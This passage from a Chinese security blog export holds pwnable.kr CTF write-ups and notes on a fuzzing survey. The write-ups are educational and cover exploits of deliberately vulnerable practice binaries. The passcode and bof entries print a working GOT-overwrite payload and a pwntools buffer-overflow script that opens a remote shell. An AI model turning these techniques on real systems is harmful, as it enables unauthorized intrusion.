class="header-anchor">#</a></h2><ul><li>与redebug相比，把粒度加大到函数，错误率与redebug相比会降低很多</li><li>当redebug的窗口设置为函数体大小时，就等于不进行正规化的VUDDY</li><li>从使用效果来看，其实还是有部分误报情况的，准确度和具体的项目有很大关系</li></ul>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— random</title>
    <url>/a4584c42.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="prandom-c">random.c</span><a href="#prandom-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">random</span>;</span><br><span class="line">	<span class="built_in">random</span> = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ <span class="built_in">random</span>) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>当<code>rand()</code>函数未设置随机种子时，默认随机种子为1，而种子相同时，每次产生的伪随机数序列都是相同的</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">random@ubuntu:~$ ./random </span><br><span class="line">3039230856</span><br><span class="line">Good!</span><br><span class="line">Mommy, I thought libc random is unpredictable...</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>Mommy, I thought libc random is unpredictable...</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— passcode</title>
    <url>/488eb6ec.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上查看<code>ssh passcode@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="ppasscode-c">passcode.c</span><a href="#ppasscode-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>考点：</p><ul><li>GOT表</li><li>scanf使用错误</li></ul><p>可以看到在函数login中对scanf的使用错误，因此我们只要能控制passcode1的值，就可以控制写入的地址</p><p>同时welcome没有参数，login也没有参数，我们可以通过welcome中的name来控制login中的passcode1的值。</p><p>用<code>objdump -S passcode</code>查看汇编代码可以看到，<code>name</code>位于<code>ebp-0x70</code>，<code>passcode1</code>位于<code>ebp-0x10</code>，<code>passcode2</code>位于<code>ebp-0xc</code>，但是<code>name</code>读入长度为100，无法覆盖到<code>passcode2</code>的值。<br>看下可执行文件中的函数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Relocation section '.rel.dyn' at offset 0x388 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">Relocation section '.rel.plt' at offset 0x398 contains 9 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0</span><br><span class="line">0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0</span><br><span class="line">0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br><span class="line">0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0</span><br><span class="line">0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0</span><br><span class="line">0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><p>可以在<code>passcode1</code>覆盖为<code>printf</code>函数的<code>GOT</code>地址，然后再输入<code>system</code>函数位置，则下次执行<code>printf</code>时其实执行的是<code>system(&quot;/etc/cat flag&quot;)</code>，在这里要注意的是调用前的参数赋值等，<code>system</code>的执行位置应放在 <code>0x80485e3</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passcode@ubuntu:~$ python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | ./passcode</span><br><span class="line">Toddler's Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">enter passcode1 : Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>Now I can safely trust you that you have credential :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— flag</title>
    <url>/5bc7dc4f.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Papa brought me a packed present! let&#39;s open it.</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>下载下来，先用<code>pwntools</code>来看下<code>checksec</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~$ checksec flag</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ubuntu&#x2F;flag&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br></pre></td></tr></table></figure><p>可以看到有UPX的壳，使用UPX工具去壳 <a href="https://upx.github.io/" target="_blank" rel="noopener">官方链接</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~&#x2F;upx$ .&#x2F;upx -d ..&#x2F;flag </span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    883745 &lt;-    335288   37.94%   linux&#x2F;amd64   flag</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><p>看起来好像没什么了，flag文件也非常的大</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>用<code>strings</code>命令看下里面的字符串，得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~$ strings flag | grep &#39;:)&#39;</span><br><span class="line">UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>UPX...? sounds like a delivery service :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— bof</title>
    <url>/a4584c42.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof</span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure><p>先看下文件，然后nc上去进行数据输入</p><a id="more"></a><h2><span id="pbof-c">bof.c</span><a href="#pbof-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">	char overflowme[32];</span><br><span class="line">	printf(&quot;overflow me : &quot;);</span><br><span class="line">	gets(overflowme);	&#x2F;&#x2F; smash me!</span><br><span class="line">	if(key &#x3D;&#x3D; 0xcafebabe)&#123;</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Nah..\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	func(0xdeadbeef);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>把<code>bof</code>拖进IDA里看下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned int __cdecl func(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  puts(&quot;overflow me : &quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  if ( a1 &#x3D;&#x3D; -889275714 )</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Nah..&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>main</code>函数调用<code>func</code>时，留出位置给key，所以让buffer溢出到key，填入<code>0xcafebabe</code>即可。IDA告诉我们s的位置位于<code>ebp-2Ch</code>处，而key的位置在<code>ebp+8h</code>处。中间要填上52个字节。</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>写python脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">ssh &#x3D; remote(&quot;pwnable.kr&quot;,9000)</span><br><span class="line">payload &#x3D; &quot;a&quot;*52+p32(0xcafebabe)</span><br><span class="line">ssh.send(payload)</span><br><span class="line">ssh.interactive()</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~$ python bof.py </span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to pwnable.kr port 9000</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>daddy, I just pwned a buFFer :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— collision</title>
    <url>/90653887.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目需要我们使用ssh登录到服务器上查看<code>ssh col@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pcol-c">col.c</span><a href="#pcol-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode &#x3D; 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">	int* ip &#x3D; (int*)p;</span><br><span class="line">	int i;</span><br><span class="line">	int res&#x3D;0;</span><br><span class="line">	for(i&#x3D;0; i&lt;5; i++)&#123;</span><br><span class="line">		res +&#x3D; ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen(argv[1]) !&#x3D; 20)&#123;</span><br><span class="line">		printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(hashcode &#x3D;&#x3D; check_password( argv[1] ))&#123;</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;cat flag&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>可以看到，要求输入一个20个字符组成的串，然后在check_password函数中，以int的方式读取这20个字符的值，如果加起来的值等于<code>0x21DD09EC</code>的话，那么就可以通过<code>hashcode==check_password(argv[1])</code>的判断，读取<code>flag</code>的内容。</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>随便凑五个数，比如有<code>0x05050505*4+0xdc8f5d8</code>，那么可以写出以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">col@ubuntu:~$ .&#x2F;col &#96;python -c &#39;print(&quot;\x05&quot;*16+&quot;\xd8\xf5\xc8\x0d&quot;)&#39;&#96;</span><br><span class="line">daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>daddy! I just managed to create a hash collision :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>The Art, Science, and Engineering of Fuzzing(TSE 2019)</title>
    <url>/92a4b7cb.html</url>
    <content><![CDATA[<h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><blockquote><p>Fuzzing三大优点：部署简单、门槛低、已有的大量经验证明了它的有效性。</p></blockquote><p>前人研究已经很多了，本文主要是做了一个系统的梳理blabla套话，目的是系统地探索模型模糊器各个阶段的设计决策，使我们的fuzzing设计更加行之有效。</p><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>对于hacker来说，fuzzing可以用来进行渗透测试和编写exp，而白帽则想利用fuzzing在被hacker攻击前找到漏洞所在。</p><p>此前已经有很多成功的研究和经典的fuzzing案例了，但不行的是，fuzzing好像遇到了瓶颈。后面的话没用了，大意就是不同论文表意不一致云云等原因搞的fuzzing领域的研究有点乱了。</p><p>所以，本文需要对前面的所有fuzzing研究进行提炼和升华。</p><p><strong>章节安排：</strong></p><p>第2节统一fuzzing术语和核心fuzzing框架，3-7节讲fuzzing每个阶段，调查相关文献，解释设计选择，讨论重要的权衡，并强调许多了不起的工程努力，有助于使现代fuzzing有效地完成其任务。</p><h2><span id="psystemization-taxonomy-and-test-programs">Systemization, Taxonomy, and Test Programs</span><a href="#psystemization-taxonomy-and-test-programs" class="header-anchor">#</a></h2><h3><span id="pfuzzing-amp-fuzzing-testing">fuzzing &amp; fuzzing testing</span><a href="#pfuzzing-amp-fuzzing-testing" class="header-anchor">#</a></h3><blockquote><p>Fuzzing：对可能的输入进行采样，得到对应的输出，类似于x-&gt;f(x)</p><p>Fuzzi testing: 目标是为了寻找bug和漏洞的fuzzing</p><p>Fuzzer：进行fuzz testing的程序</p><p>Fuzz Campaign：有一定安全策略的运行一个fuzzer</p><p>Bug Oracle：待检测的样本</p><p>Fuzz Configuration：fuzz的算法和策略，例如种子如何生成等</p></blockquote><h3><span id="ppaper-selection-criteria">Paper Selection Criteria</span><a href="#ppaper-selection-criteria" class="header-anchor">#</a></h3><p>选了哪些会议的文章云云</p><h3><span id="pfuzz-testing-algorithm">Fuzz Testing Algorithm</span><a href="#pfuzz-testing-algorithm" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd5h2obcfdj30po0eudic.jpg" alt="image-20200325001530872"></p><blockquote><p>模糊测试的算法目的是：在有限的时间，一定的约束条件下找到有限的bugs</p></blockquote><p>算法可以分为两个部分：Preprocess部分和 n轮的循环，循环包含五个部分（但在实际中有的可以不要）：schedule、inputgen、inputeval、confupdate、continue，从名字上可以很显然的看出来都是在做什么。一次循环在本文中称为fuzz iteration，简单理解就相当于编译里面的一个pass吧。一次inputeval称为fuzz run。</p><ul><li>$\text{PREPROCESS}(\mathbb{C}) \rightarrow \mathbb{C}$ ：根据用户的fuzzing configuration 进行一些可能的修改和获取一些fuzz中需要信息，比如插装，样本运行时间等</li><li>$\text { SCHEDULE (} \mathbb{C}, \left.t_{\text {elapsed }}, t_{\text {limit }}\right) \rightarrow \text { conf }$ ：根据当前时间和截止时间从当前的fuzzing configure里选取一个待测configure</li><li>$\text { INPUTGEN (conf) } \rightarrow \text { tcs }$ ：根据configure生成待测用例</li><li>$\text { Inpureval (conf, }\left. \text { tcs, } O_{\text {bug }}\right) \rightarrow \mathbb{B}^{\prime} , execinfos$ : 以生成用例和configure，并嵌入bug oracle（检查是否为bug）输入，得到bug和执行信息</li><li>$\text { CONFUPDATE (} \mathbb{C}, conf, execinfos) \rightarrow \mathbb{C}$ ：更新策略</li><li>$\text { CONTINUE }(\mathbb{C}) \rightarrow{\text { True, False }}$ ：判断是否退出</li></ul><h3><span id="ptaxonomy-of-fuzzers">Taxonomy of Fuzzers</span><a href="#ptaxonomy-of-fuzzers" class="header-anchor">#</a></h3><p>黑盒、白盒、灰盒</p><h3><span id="pfuzzer-genealogy-and-overview">Fuzzer Genealogy and Overview</span><a href="#pfuzzer-genealogy-and-overview" class="header-anchor">#</a></h3><p>不得不说汇总的真详细，直接po图了，各个研究的时间线，黑白灰，以及侧重方向一览无余</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdca4wf3u7j30u00xvtev.jpg" alt="image-20200330213421085"></p><p>以及一个整理好的表</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdca5cldlbj30u011f7g6.jpg" alt="image-20200330213449440"></p><h2><span id="ppreprocess">PreProcess</span><a href="#ppreprocess" class="header-anchor">#</a></h2><h3><span id="pinstrumentation">Instrumentation</span><a href="#pinstrumentation" class="header-anchor">#</a></h3><p>通过插桩来获取在fuzz过程中的有用信息，可以是静态的插桩，也可以是动态的插桩</p><p>静态插桩需要的开销要小，但是需要找同版本的依赖库编译，除了源代码级别的静态插桩，也有二进制级别的静态插桩</p><p>动态插桩需要的开销要大，不过好处是更容易检测动态链接库，工具有：DynInst , DynamoRIO , Pin , Valgrind, and QEMU.</p><p>有的fuzzer可以静态插桩也可以动态插桩</p><ul><li>Execution Feedback：<ul><li>路径覆盖：AFL及其衍生、CollAFL</li><li>结点覆盖：LibFuzzer、Syzkaller</li><li>可选：Honggfuzz</li></ul></li><li>In-Memory Fuzzing：对于一些应用，例如有GUI的程序，初始化绘制GUI什么会浪费时间，这个时候可以dump下初始化后的内存空间来节约时间。有的fuzzer在内存中对一个函数反复fuzzing，称为API fuzzing。缺点：1.不好重建bug产生时的上下文进行复现。2.对于跨函数调用的fuzz可能会出问题。</li><li>Thread Scheduling：条件竞争很难触发，因为它们依赖于不确定的行为，这种行为可能很少发生。但是，通过显式地控制线程的调度方式，插桩也可以用来触发不同的非确定性程序行为已有的研究表明，即使随机调度线程也可以有效地发现竞争条件错误。</li></ul><h3><span id="pseed-selection">Seed Selection</span><a href="#pseed-selection" class="header-anchor">#</a></h3><p>有的情况下fuzzing的取值域会很广，例如MP3文件等。</p><p>因此如何选择最小的初始化种子集合称为种子选择问题，目的是：找到最小的初始种子集合，使得在fuzzing过程中覆盖率最大化。也就是使得fuzzing的效率更高。</p><p>例如我们有种子s1，它能覆盖到{10,20}，以及s2-&gt;{20,30}，那么如果这个时候种子s3-&gt;{10,20,30}，则显然以s3作为初始种子更加高效。</p><h3><span id="pseed-trimming">Seed Trimming</span><a href="#pseed-trimming" class="header-anchor">#</a></h3><p>较小的种子集合可能会消耗较少的内存并引发更高的吞吐量，所以一些fuzzers在fuzz之前减小种子集合的大小，这便是种子集合的修剪。</p><p>一般发生在PREPROCESS或者CONFUPDATE之中</p><h3><span id="ppreparing-a-driver-application">Preparing a Driver Application</span><a href="#ppreparing-a-driver-application" class="header-anchor">#</a></h3><p>对于一些没法直接fuzzing的情况，可能需要自己写一个driver程序。</p><h2><span id="pscheduling">SCHEDULING</span><a href="#pscheduling" class="header-anchor">#</a></h2><p>调度是只选择一个fuzz configuration，然后进入下一轮的fuzz。对于简单的fuzzer，例如zzuf，则没有这个步骤。已有的研究中，ADLFast，BFF等的亮点就在于他们使用的调度策略。</p><p>本节只讨论黑盒和灰盒 fuzzing中的调度策略。</p><h3><span id="pthe-fuzz-configuration-scheduling-fcs-problem">The Fuzz Configuration Scheduling (FCS) Problem</span><a href="#pthe-fuzz-configuration-scheduling-fcs-problem" class="header-anchor">#</a></h3><p>调度的目标：</p><ul><li>分析当前configure信息</li><li>找到可能有最好结果的输入：bugs最多或者覆盖面最大</li><li>…</li></ul><p>还有一些算法1中的解释，很明白</p><h3><span id="pblack-box-fcs-algorithms">Black-box FCS Algorithms</span><a href="#pblack-box-fcs-algorithms" class="header-anchor">#</a></h3><p>对于黑盒fuzzing来说，能够用于FCS的只有：已有的crashes和bugs信息+执行时间</p><p>举例</p><ul><li>HouseHolder、Foote提出成功率指标：#bugs / #runs</li><li>MAB 算法：faster to fuzz allows a fuzzer to either collect more unique bugs with it, or decrease the upperbound on its future success probability more rapidly.</li></ul><h3><span id="pgrey-box-fcs-algorithms">Grey-box FCS Algorithms</span><a href="#pgrey-box-fcs-algorithms" class="header-anchor">#</a></h3><p>灰盒fuzzing能获取的信息比黑盒更多，例如覆盖率等信息</p><p>AFL提出EA算法，EA算法维护了一系列的configuration，从中间选取fit的configurations用来生成待测用例</p><p>疑问三连：</p><ul><li>what makes a configuration fit？</li><li>how configurations are selected</li><li>how a selected configu- ration is used.</li></ul><p>大部分fuzzers都会考虑控制流关系。</p><ul><li><p>AFL的策略是选取最快最小的输入，称为fit（favorite）的</p></li><li><p>AFLfast优化了AFL，快7倍，发现了3个AFL没发现的bug</p><ul><li><p>选择路径频率最小的来探索稀有路径</p></li><li><p>基于优先级来选择configuration，而不是循环选择</p></li><li><p>使用power 